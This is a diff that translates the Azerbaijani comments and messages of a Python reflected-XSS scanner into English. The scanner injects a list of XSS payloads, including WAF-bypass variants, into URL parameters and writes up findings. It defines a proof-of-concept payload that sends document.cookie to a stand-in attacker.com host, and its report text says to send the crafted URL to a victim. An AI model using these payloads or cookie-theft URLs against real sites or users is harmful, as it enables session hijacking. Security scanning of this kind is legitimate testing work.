@@ -1,6 +1,6 @@
 """
 XSS Scanner — Reflected XSS detection
-Passive: payload göndər, response-da reflection yoxla
+Passive: send payload, check for reflection in the response
 """
 
 import asyncio
@@ -11,7 +11,7 @@ from core.models import Vulnerability, Severity
 
 console = Console()
 
-# WAF bypass + encoding variantları
+# WAF bypass + encoding variants
 XSS_PAYLOADS = [
     # Basic
     '<script>alert(1)</script>',
@@ -43,7 +43,7 @@ XSS_PAYLOADS = [
     "' autofocus onfocus='alert(1)",
 ]
 
-# Reflection yoxlamaq üçün unique marker
+# Unique marker to check reflection
 MARKER = "xsstest7731"
 MARKER_PAYLOADS = [
     f'<{MARKER}>',
@@ -51,8 +51,8 @@ MARKER_PAYLOADS = [
     f"'{MARKER}'",
 ]
 
-# BUG FIX 1: f-string içində backslash işlətmək olmaz (Python 3.11),
-# ona görə XSS PoC payloadu ayrı dəyişəndə saxlanılır.
+# BUG FIX 1: you can't use a backslash inside an f-string (Python 3.11),
+# so the XSS PoC payload is kept in a separate variable.
 XSS_POC_PAYLOAD = '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>'
 
 
@@ -61,13 +61,13 @@ class XSSScanner:
         self.http_client = http_client
 
     def _extract_params(self, url: str) -> list[tuple]:
-        """URL-dən parametrləri çıxar"""
+        """Extract parameters from the URL"""
         parsed = urlparse(url)
         params = parse_qs(parsed.query, keep_blank_values=True)
         return list(params.keys())
 
     def _inject_payload(self, url: str, param: str, payload: str) -> str:
-        """URL-ə payload inject et"""
+        """Inject payload into the URL"""
         parsed = urlparse(url)
         params = parse_qs(parsed.query, keep_blank_values=True)
         params[param] = [payload]
@@ -75,17 +75,17 @@ class XSSScanner:
         return urlunparse(parsed._replace(query=new_query))
 
     def _check_reflection(self, payload: str, response_text: str) -> bool:
-        """Payload response-da reflect olunub mu?"""
-        # HTML encode olmadan reflection
+        """Is the payload reflected in the response?"""
+        # Reflection without HTML encoding
         if payload.lower() in response_text.lower():
             return True
-        # Partial reflection (tag-lar arasında)
+        # Partial reflection (between tags)
         if MARKER in response_text:
             return True
         return False
 
     def _is_executable(self, payload: str, response_text: str) -> bool:
-        """Payload execution context-də mi?"""
+        """Is the payload in an execution context?"""
         dangerous_patterns = [
             r'<script[^>]*>' + re.escape(MARKER),
             re.escape(payload),
@@ -99,7 +99,7 @@ class XSSScanner:
     async def _test_param(self, url: str, param: str) -> list[Vulnerability]:
         vulns = []
 
-        for payload in XSS_PAYLOADS[:8]:  # İlk 8 payload — sürətli test
+        for payload in XSS_PAYLOADS[:8]:  # First 8 payloads — quick test
             test_url = self._inject_payload(url, param, payload)
             response = await self.http_client.get(test_url)
 
@@ -114,8 +114,8 @@ class XSSScanner:
                 is_exec = self._is_executable(payload, response.text)
                 cvss = 7.2 if is_exec else 5.4
 
-                # BUG FIX 1: XSS_POC_PAYLOAD dəyişəni işlədilir,
-                # f-string içində birbaşa backslash-dırnaq yoxdur.
+                # BUG FIX 1: uses the XSS_POC_PAYLOAD variable,
+                # no direct backslash-quote inside the f-string.
                 poc_url = self._inject_payload(url, param, XSS_POC_PAYLOAD)
 
                 vuln = Vulnerability(
@@ -123,22 +123,22 @@ class XSSScanner:
                     url=test_url,
                     severity=Severity.HIGH if is_exec else Severity.MEDIUM,
                     cvss_score=cvss,
-                    title=f"Reflected XSS — {param} parametri",
+                    title=f"Reflected XSS — {param} parameter",
                     description=(
-                        f"'{param}' parametrindəki user input HTML-ə encode edilmədən "
-                        f"response-da reflect olunur. Bu XSS hücumuna imkan verir."
+                        f"The user input in the '{param}' parameter is reflected in the "
+                        f"response without HTML encoding. This allows an XSS attack."
                     ),
-                    evidence=f"Payload '{payload}' response-da tapıldı",
+                    evidence=f"Payload '{payload}' found in response",
                     exploitation=(
-                        f"Victim-ə bu URL-i göndər:\n"
+                        f"Send this URL to the victim:\n"
                         f"{test_url}\n\n"
-                        f"Daha effektiv payload:\n"
+                        f"More effective payload:\n"
                         f"{poc_url}"
                     ),
                     remediation=(
-                        "1. User input-u HTML encode et (htmlspecialchars PHP-də)\n"
-                        "2. Content-Security-Policy header əlavə et\n"
-                        "3. Output context-ə görə encoding tətbiq et"
+                        "1. HTML encode user input (htmlspecialchars in PHP)\n"
+                        "2. Add a Content-Security-Policy header\n"
+                        "3. Apply encoding based on the output context"
                     ),
                     parameter=param,
                     method="GET",
@@ -151,12 +151,12 @@ class XSSScanner:
                     ],
                 )
                 vulns.append(vuln)
-                break  # Bir vuln tapdıqda bu param üçün dayanma
+                break  # Stop for this param once one vuln is found
 
         return vulns
 
     async def scan(self, url: str, extra_params: list[str] = None) -> list[Vulnerability]:
-        """URL-i XSS üçün skan et"""
+        """Scan the URL for XSS"""
         params = self._extract_params(url)
         if extra_params:
             params.extend(extra_params)
@@ -164,7 +164,7 @@ class XSSScanner:
         if not params:
             return []
 
-        console.print(f"  [dim]XSS skan: {len(params)} parametr — {url[:60]}[/dim]")
+        console.print(f"  [dim]XSS scan: {len(params)} parameters — {url[:60]}[/dim]")
 
         tasks = [self._test_param(url, param) for param in params]
         results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -175,6 +175,6 @@ class XSSScanner:
                 vulns.extend(r)
 
         for v in vulns:
-            console.print(f"  {v.severity.emoji} [bold red]XSS tapıldı:[/bold red] {v.parameter} @ {url[:50]}")
+            console.print(f"  {v.severity.emoji} [bold red]XSS found:[/bold red] {v.parameter} @ {url[:50]}")
 
         return vulns
